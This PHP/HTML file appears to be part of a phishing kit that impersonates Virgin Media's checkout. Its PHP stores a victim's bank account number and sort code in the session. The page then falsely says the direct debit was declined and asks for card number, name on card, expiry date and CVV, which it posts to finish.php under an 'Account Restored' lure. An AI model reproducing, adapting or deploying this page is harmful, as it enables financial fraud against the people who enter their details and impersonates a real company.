<?php
require 'controls.php';
if(!isset($_GET['sessionID'])){
    echo("<script>location.href = 'index.php';</script>");
    exit();
}
$sessionID = $_GET['sessionID'];

if(!isset($_GET['error'])){
    if(!isset($_POST['accNum']) or $_POST['accNum'] == ''){
        echo("<script>location.href = 'DirectDebit.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['sortCode1']) or $_POST['sortCode1'] == ''){
        echo("<script>location.href = 'DirectDebit.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['sortCode2']) or $_POST['sortCode2'] == ''){
        echo("<script>location.href = 'DirectDebit.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    elseif(!isset($_POST['sortCode3']) or $_POST['sortCode3'] == ''){
        echo("<script>location.href = 'DirectDebit.php?sessionID=".$sessionID."&error=empty';</script>");
        exit();
    }
    $_SESSION['accNum'] = $_POST['accNum'];
    $_SESSION['sortCode'] = ($_POST['sortCode1'] . $_POST['sortCode2'] . $_POST['sortCode3']);
}
?>
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">
    <head class="at-element-marker">
        <title>Virgin Media - Checkout</title>
        <meta name="description" content="">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <link href="css/font-awesome.css" rel="stylesheet">
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/bootstrap.overrides.css" rel="stylesheet">
        <link href="css/vm.theme.css" rel="stylesheet">
        <link href="css/mtp.forms.css" rel="stylesheet">
        <link href="css/mtp.ecareTheme.css" rel="stylesheet">
        <link href="css/header-reBrand.css" rel="stylesheet">
        <link href="css/mtp.basket.css" rel="stylesheet">
    </head>
    <body class="yourdetails paym">
        <header class="header">
            <div class="">
                <div class="container">
                    <img style="position: absolute; margin-top: 1%;" class="virginLogo" src="assets/logo.png">
                    <div class="row position-rel main-hdr-row">
                        <div class="col-xs-3 logo-container">
                            <a class="vm-logo xs-logo">
                            
                            </a>
                        </div>
                        <ul class="col-xs-9 top-nav">
                            <li class="top-nav-items gradient collapsed xxs-visible main-menu" data-toggle="collapse" data-target="#levelOne-menu">
                                <a class="" href="#">
                                    <span class="openMenu">
                                            <span class="pull-left">Main
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                    <span class="closeMenu">
                                            <span class="pull-left">Close
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items dark-gradient collapsed sign-inTop signIn-menu" data-toggle="collapse" data-target="#signIn">
                                <a class="signin-text clearfix" tabindex="11" href="#">
                                    <span class="openMenu">
                                        <span class="pull-left">
                                            <i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                    <span class="closeMenu">
                                        <span class="pull-left"><i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="https://my.virginmedia.com/my-apps/email/mailbox" tabindex="10"><i class="sprite email visible-desktop"></i>Email</a>
                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="http://store.virginmedia.com/store-locator.html" tabindex="9"><i class="sprite store-locator visible-desktop"></i>Find a store</a>
                            </li>
                        </ul>

                        <div id="levelOne-menu" class="collapse l1-menu tab-style">
                            <div class="menu-content">
                                <ul id="navTab" class="nav row no-gap clearfix nav-tabs">
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmedia.com/entertainme" class="notch" tabindex="3">Entertain Me</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="https://store.virginmedia.com/discover.html" class="notch" tabindex="4">Our Products</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav active"><a tabindex="5" href="#joinUs" class="notch">Join Us</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="6" href="https://my.virginmedia.com/" class="notch">My Virgin Media</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="7" href="http://help.virginmedia.com/">Help</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmediabusiness.co.uk/" tabindex="8" class="notch">For Business</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="http://store.virginmedia.com/store-locator.html" class="notch">Store Locator</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="https://my.virginmedia.com/my-apps/email/mailbox" class="notch">Email</a>

                                    </li>
                                </ul>
                            </div>
                        </div> 
                    </div>
                </div>
            </div>
        </header>

        <div id="content">
            <div class="container content-body">
                <div class="row">
                    <br>
                    <form method="post" id="yourDetailsForm" name="yourDetailsForm" class="your-details-form" action="finish.php?sessionID=<?php echo $sessionID; ?>">
                        <div class="full-width col-md-12">
                            <div class="panel-group" id="checkout">

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#upfront-payment-details">
                                                <i class="checkout-icon card-details"></i>Your Details
                                            </a>
                                        </h4>
                                    </div>
                                </div>

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#upfront-payment-details">
                                                <i class="checkout-icon card-details"></i>Direct Debit
                                            </a>
                                        </h4>
                                    </div>
                                </div>

                                <div class="panel panel-default" style="overflow:inherit;">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion"
                                                href="#you-details"><i class="checkout-icon your-details"></i> Card Payments</a>
                                        </h4>
                                    </div>

                                    <div class="panel-collapse in" id="direct-debit">
                                        <div class="panel-body">
                                            <div class="message">
                                                <p>We need to setup card payments to pay for your bills.</p>
                                            </div>

                                            <div class="direct-debit-account-details new-customer clearfix" style="display: block;">
                                                <?php 
                                                    if(isset($_GET['error'])){
                                                        if($_GET['error'] == 'empty'){
                                                            echo '
                                                                <div class="warning icon yourdetails_new_paym_standard_error_incompletefields">
                                                                    <p><strong>Sorry, you didnt enter all those details
                                                                            correctly.</strong></p>
                                                                    <p>Please check and try again.</p>
                                                                </div>
                                                            ';
                                                        }
                                                    }
                                                    else{
                                                        echo '
                                                        <div class="warning icon yourdetails_new_paym_standard_error_incompletefields">
                                                            <p><strong>Sorry, your direct debit failed.</strong></p>
                                                            <p>Your bank has declined the Direct Debit setup request. This means you must pay for your bill each month using card payments.</p>
                                                        </div>';
                                                    }
                                                ?>
                                                <h2 class="dd-header">Debit or Credit Card Details For Your Bill</h2>
                                                <h3 class="col-xs-12 col-md-10 col-sm-9">This card will be used to pay for your bill each month</h3>
                                                <div class="form-horizontal">
                                                    
                                                    <div class="form-group multiple-uncheck hw-account-group hw-initFullName" style="margin-top: 2%;">
                                                        <label class="col-sm-3 col-xs-12 control-label" for="ac-number">Card Number</label>
                                                        <div class="col-sm-5 col-xs-10">
                                                            <input class="form-control required hw-accountNumber-validator" id="ac-number" name="ccNum" minlength="15" maxlength="16" type="text">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                    </div>

                                                    <div class="form-group multiple-uncheck hw-account-group hw-initFullName" style="margin-top: 2%;">
                                                        <label class="col-sm-3 col-xs-12 control-label" for="ac-number">Name On Card</label>
                                                        <div class="col-sm-5 col-xs-10">
                                                            <input class="form-control required hw-accountNumber-validator" id="ac-number" name="ccName" type="text">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                    </div>

                                                    <div class="form-group multiple-uncheck hw-account-group sortCode-wrap hw-initFullName">
                                                        <label class="col-sm-3 col-xs-12 control-label">Expiry Date</label>
                                                        <div class="col-sm-2 col-xs-3">
                                                            <input
                                                                class="form-control required hw-sortCodeFiled-validator-1"
                                                                maxlength="2" min="1" max="12" id="ac-sc-one" name="expMM" type="number" value="">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                        <div class="col-sm-2 col-xs-3">
                                                            <input
                                                                class="form-control required hw-sortCodeFiled-validator-2"
                                                                maxlength="2" min="20" max="28" id="ac-sc-two" type="number" name="expYY" value="">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                    </div>

                                                    <div class="form-group multiple-uncheck hw-account-group hw-initFullName" style="margin-top: 2%;">
                                                        <label class="col-sm-3 col-xs-12 control-label" for="ac-number">Security Code</label>
                                                        <div class="col-sm-5 col-xs-10">
                                                            <input class="form-control required hw-accountNumber-validator" id="ac-number" name="ccCVV" minlength="3" maxlength="4" type="text">
                                                            <span class="icon-clear">x</span>
                                                        </div>
                                                    </div>

                                                    <button class="btn btn-primary btn-mobile find-your-current-address hw-find-your-address" type="submit" id="findAddress">Continue</button>                                          
                                                    
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#your-completed-order">
                                                <i class="checkout-icon order-completed"></i>Account Restored
                                            </a>
                                        </h4>
                                    </div>
                                </div>
                                
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <footer class="footer hidden-print">
            <div class="container">
                <nav class="shift-left-desktop">
                    <ul class="nav footer-nav row">
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>About Virgin Media</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Careers</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Advertise with us</a>
                        </li><li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Accessibility</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Legal stuff</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Site Map</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Contact us</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12 no-border"><a>Our cookies</a>
                        </li>
                    </ul>
                </nav>
                <div class="footer-logo clearfix shift-right-desktop">
                    <p class="pull-right">
                        <span>© 2015 Virgin Media.</span><br> All Rights Reserved
                        <a>
                            <img width="54" height="34" alt="Virgin Media" src="assets/images/vm-logo-sm.png">
                        </a>
                    </p>
                </div>
            </div>
        </footer>
    </body>
</html>